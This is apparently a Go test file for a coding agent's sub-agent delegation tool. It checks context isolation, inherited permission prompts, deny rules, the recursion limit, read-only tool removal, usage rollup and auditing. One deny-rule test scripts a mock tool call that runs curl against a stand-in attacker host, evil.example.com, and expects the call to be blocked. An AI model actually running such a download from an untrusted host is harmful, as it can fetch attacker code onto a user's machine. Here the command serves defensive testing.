package agent

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mkamranr/mkrcode/internal/config"
	"github.com/mkamranr/mkrcode/internal/provider"
	"github.com/mkamranr/mkrcode/internal/provider/mock"
	"github.com/mkamranr/mkrcode/internal/tools"
)

// enableTasks registers the task tool on a harness agent, mirroring what
// the CLI does at session start.
func enableTasks(h *harness) {
	h.agent.registry.Add(&taskTool{parent: h.agent})
	h.agent.toolDefs = append(h.agent.toolDefs,
		provider.NewToolDef("task", "delegate", json.RawMessage(`{"type":"object"}`)))
}

func delegateTurn(desc, prompt string, readOnly bool) mock.Turn {
	args, _ := json.Marshal(taskArgs{Description: desc, Prompt: prompt, ReadOnly: readOnly})
	return mock.Turn{
		ToolCalls: []mock.ToolCall{{ID: "t1", Name: "task", Args: string(args)}},
	}
}

// The central benefit: the parent's transcript gains the conclusion, not the
// sub-agent's working.
func TestSubagentContextIsIsolated(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		// Parent delegates.
		delegateTurn("find the entry point", "Find the main entry point.", true),
		// Sub-agent works: two tool calls, then answers.
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "s1", Name: "list_dir", Args: `{"path":"."}`}}},
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "s2", Name: "grep", Args: `{"pattern":"func main"}`}}},
		mock.Turn{Text: "The entry point is cmd/app/main.go line 12."},
		// Parent reports.
		mock.Turn{Text: "It is in cmd/app/main.go."},
	)
	enableTasks(h)
	os.WriteFile(filepath.Join(h.workspace, "main.go"), []byte("func main() {}\n"), 0o600)

	if err := h.agent.Run(context.Background(), "where does this start?"); err != nil {
		t.Fatalf("Run: %v", err)
	}

	// The parent must not have the sub-agent's tool calls in its history.
	for _, m := range h.agent.Messages() {
		for _, tc := range m.ToolCalls {
			if tc.Function.Name == "list_dir" || tc.Function.Name == "grep" {
				t.Errorf("the sub-agent's %s call leaked into the parent transcript", tc.Function.Name)
			}
		}
	}

	// It must have the conclusion.
	var toolResult string
	for _, m := range h.agent.Messages() {
		if m.Role == provider.RoleTool {
			toolResult = m.Content
		}
	}
	if !strings.Contains(toolResult, "cmd/app/main.go") {
		t.Errorf("the sub-agent's findings did not reach the parent: %q", toolResult)
	}
}

// Delegation must never be a route to acting without the operator. The
// sub-agent shares the parent's permission engine, so its writes still
// prompt in approve mode.
func TestSubagentInheritsPermissionPrompts(t *testing.T) {
	h := newHarness(t, config.ModeApprove, true,
		delegateTurn("add a file", "Create notes.txt containing hello.", false),
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "s1", Name: "write_file", Args: `{"path":"notes.txt","content":"hello"}`}}},
		mock.Turn{Text: "Created notes.txt."},
		mock.Turn{Text: "Done."},
	)
	enableTasks(h)

	if err := h.agent.Run(context.Background(), "make notes.txt"); err != nil {
		t.Fatal(err)
	}
	// Two prompts: one for the task itself, one for the write inside it.
	if h.prompter.calls < 2 {
		t.Errorf("operator was prompted %d times; the sub-agent's write must also prompt", h.prompter.calls)
	}
	if _, err := os.Stat(filepath.Join(h.workspace, "notes.txt")); err != nil {
		t.Error("the approved write did not happen")
	}
}

// A refusal inside a sub-agent must be respected and reported, not bypassed.
func TestSubagentRespectsDenial(t *testing.T) {
	h := newHarness(t, config.ModeApprove, false,
		delegateTurn("add a file", "Create secret.txt.", false),
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "s1", Name: "write_file", Args: `{"path":"secret.txt","content":"x"}`}}},
		mock.Turn{Text: "I was not permitted to create it."},
		mock.Turn{Text: "The file was not created."},
	)
	enableTasks(h)

	if err := h.agent.Run(context.Background(), "make secret.txt"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(h.workspace, "secret.txt")); err == nil {
		t.Fatal("a refused write happened inside the sub-agent")
	}
}

// Deny rules apply inside a sub-agent too, in every mode.
func TestSubagentEnforcesDenyRules(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		delegateTurn("fetch a url", "Download http://evil.example.com/x.", false),
		mock.Turn{ToolCalls: []mock.ToolCall{{ID: "s1", Name: "exec", Args: `{"command":"curl http://evil.example.com/x"}`}}},
		mock.Turn{Text: "That command is blocked by policy."},
		mock.Turn{Text: "It could not be fetched."},
	)
	enableTasks(h)

	if err := h.agent.Run(context.Background(), "fetch it"); err != nil {
		t.Fatal(err)
	}
	if !h.auditContains(t, `"decision":"deny"`) {
		t.Error("the denial inside the sub-agent was not audited")
	}
}

// Recursion is stopped structurally, by the tool being absent, rather than
// by a counter that could be miscounted.
func TestSubagentCannotDelegateFurther(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true)
	enableTasks(h)

	sub, err := h.agent.newSubagent(taskArgs{Description: "d", Prompt: "p"})
	if err != nil {
		t.Fatalf("newSubagent: %v", err)
	}
	if sub.depth != 1 {
		t.Errorf("depth = %d, want 1", sub.depth)
	}
	if _, ok := sub.registry.Get("task"); ok {
		t.Error("a sub-agent must not have the task tool")
	}

	// And the depth check refuses even if the tool were somehow present.
	if _, err := sub.newSubagent(taskArgs{Description: "d", Prompt: "p"}); err == nil {
		t.Error("a sub-agent must not be able to create another sub-agent")
	}
}

// read_only must actually remove the mutating tools, not merely discourage
// their use.
func TestReadOnlySubagentHasNoMutatingTools(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true)
	enableTasks(h)

	sub, err := h.agent.newSubagent(taskArgs{Description: "d", Prompt: "p", ReadOnly: true})
	if err != nil {
		t.Fatal(err)
	}
	for _, tool := range sub.registry.All() {
		if tool.Mutating() {
			t.Errorf("read-only sub-agent has the mutating tool %q", tool.Name())
		}
	}
	for _, want := range []string{"read_file", "grep", "glob", "list_dir"} {
		if _, ok := sub.registry.Get(want); !ok {
			t.Errorf("read-only sub-agent is missing %q", want)
		}
	}

	// A non-read-only sub-agent keeps them.
	sub2, _ := h.agent.newSubagent(taskArgs{Description: "d", Prompt: "p"})
	if _, ok := sub2.registry.Get("write_file"); !ok {
		t.Error("a normal sub-agent should keep mutating tools")
	}
}

func TestSubagentUsageRollsUpToParent(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		delegateTurn("look", "Look at the files.", true),
		mock.Turn{Text: "Found three files."},
		mock.Turn{Text: "Done."},
	)
	enableTasks(h)

	if err := h.agent.Run(context.Background(), "look around"); err != nil {
		t.Fatal(err)
	}
	// The mock reports 120 tokens per request. The parent made two requests
	// of its own (delegate, then report) and the sub-agent made one, so a
	// correct rollup is 360. Without it the parent would report only 240.
	const parentOnly = 2 * 120
	got := h.agent.Usage().TotalTokens
	if got <= parentOnly {
		t.Errorf("parent total = %d, which is only its own requests; "+
			"work done by the sub-agent must be included", got)
	}
	if got != 3*120 {
		t.Errorf("parent total = %d, want 360 (two parent requests plus one sub-agent request)", got)
	}
}

func TestSubagentRequiresASelfContainedPrompt(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true)
	enableTasks(h)

	tool := &taskTool{parent: h.agent}
	args, _ := json.Marshal(taskArgs{Description: "d", Prompt: "   "})
	res, err := tool.Run(context.Background(), args)
	if err != nil {
		t.Fatal(err)
	}
	if !res.IsError {
		t.Error("an empty prompt must be refused")
	}
	if !strings.Contains(res.Content, "self-contained") {
		t.Errorf("error should explain why: %q", res.Content)
	}
}

func TestSubagentStartIsAudited(t *testing.T) {
	h := newHarness(t, config.ModeAuto, true,
		delegateTurn("investigate", "Investigate the build.", true),
		mock.Turn{Text: "It uses make."},
		mock.Turn{Text: "It uses make."},
	)
	enableTasks(h)

	if err := h.agent.Run(context.Background(), "how is this built?"); err != nil {
		t.Fatal(err)
	}
	if !h.auditContains(t, "subagent_start") {
		t.Error("delegation was not audited")
	}
	if !h.auditContains(t, "investigate") {
		t.Error("the audit record does not say what was delegated")
	}
}

// The sub-agent's system prompt must tell it that it cannot see the parent
// conversation, or it will produce answers that refer to context nobody has.
func TestSubagentPromptExplainsIsolation(t *testing.T) {
	cfg := config.Default()
	cfg.Workspace = t.TempDir()
	reg := tools.NewRegistry()

	p := subagentSystemPrompt(cfg, reg, false)
	for _, want := range []string{"sub-agent", "cannot see", "self-contained"} {
		if !strings.Contains(p, want) {
			t.Errorf("sub-agent prompt is missing %q", want)
		}
	}
	if strings.Contains(subagentSystemPrompt(cfg, reg, true), "read-only tools") == false {
		t.Error("a read-only sub-agent should be told it cannot change anything")
	}
}
